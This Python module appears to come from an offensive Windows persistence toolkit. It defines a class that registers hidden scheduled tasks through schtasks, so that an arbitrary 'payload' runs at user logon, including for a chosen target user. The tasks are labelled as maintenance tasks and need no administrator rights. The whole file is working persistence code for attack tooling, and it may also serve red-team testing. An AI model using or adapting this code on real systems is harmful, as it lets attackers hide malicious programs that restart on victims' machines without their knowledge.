"""
Logon-triggered scheduled task persistence
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import (
    run_command,
    validate_payload_path,
    get_current_username,
    clean_temp_file
)
from templates.xml_templates import TaskXMLTemplates
from config import DEFAULT_STAGING_DIR


class LogonTrigger:
    """Handles logon-triggered scheduled tasks"""
    
    def __init__(self):
        self.xml_templates = TaskXMLTemplates()
    
    def create(self, task_name, payload_path):
        """
        Create task that triggers on user logon
        
        Args:
            task_name (str): Name for the task
            payload_path (str): Path to payload
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating logon-triggered scheduled task...")
        print(f"[*] Task name: {task_name}")
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Get current user
        user = get_current_username()
        
        # Generate XML
        task_xml = self.xml_templates.logon_trigger(user, payload_path)
        
        # Save XML to temporary file
        xml_file = os.path.join(DEFAULT_STAGING_DIR, f"{task_name}.xml")
        
        try:
            with open(xml_file, 'w', encoding='utf-16') as f:
                f.write(task_xml)
            
            # Create task from XML
            command = f'schtasks /Create /TN "{task_name}" /XML "{xml_file}" /F'
            result = run_command(command)
            
            # Clean up XML file
            clean_temp_file(xml_file)
            
            if result['success']:
                print(f"[+] Scheduled task created successfully!")
                print(f"    Task Name: {task_name}")
                print(f"    Trigger: User logon")
                print(f"    User: {user}")
                print(f"    Payload: {payload_path}")
                print(f"    Hidden: Yes")
                print(f"    Admin Required: No")
                
                return {
                    'method': 'logon_trigger',
                    'task_name': task_name,
                    'trigger': 'logon',
                    'user': user,
                    'payload': payload_path,
                    'requires_admin': False,
                    'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
                }
            else:
                print(f"[-] Failed to create task")
                if result.get('stderr'):
                    print(f"    Error: {result['stderr']}")
                return None
        
        except Exception as e:
            print(f"[-] Error: {e}")
            clean_temp_file(xml_file)
            return None
    
    def create_for_user(self, task_name, payload_path, target_user):
        """
        Create logon task for specific user
        
        Args:
            task_name (str): Task name
            payload_path (str): Payload path
            target_user (str): Target username
            
        Returns:
            dict: Installation result
        """
        print(f"[*] Creating logon task for user: {target_user}")
        
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        # Generate XML for specific user
        task_xml = self.xml_templates.logon_trigger(
            target_user, 
            payload_path,
            f"User-specific maintenance task for {target_user}"
        )
        
        xml_file = os.path.join(DEFAULT_STAGING_DIR, f"{task_name}.xml")
        
        try:
            with open(xml_file, 'w', encoding='utf-16') as f:
                f.write(task_xml)
            
            command = f'schtasks /Create /TN "{task_name}" /XML "{xml_file}" /F'
            result = run_command(command)
            
            clean_temp_file(xml_file)
            
            if result['success']:
                print(f"[+] Task created for user: {target_user}")
                print(f"    Task Name: {task_name}")
                print(f"    Trigger: {target_user} logon")
                
                return {
                    'method': 'logon_trigger_user',
                    'task_name': task_name,
                    'trigger': 'logon',
                    'user': target_user,
                    'payload': payload_path,
                    'remove_command': f'schtasks /Delete /TN "{task_name}" /F'
                }
            else:
                print(f"[-] Failed to create task")
                return None
        
        except Exception as e:
            print(f"[-] Error: {e}")
            clean_temp_file(xml_file)
            return None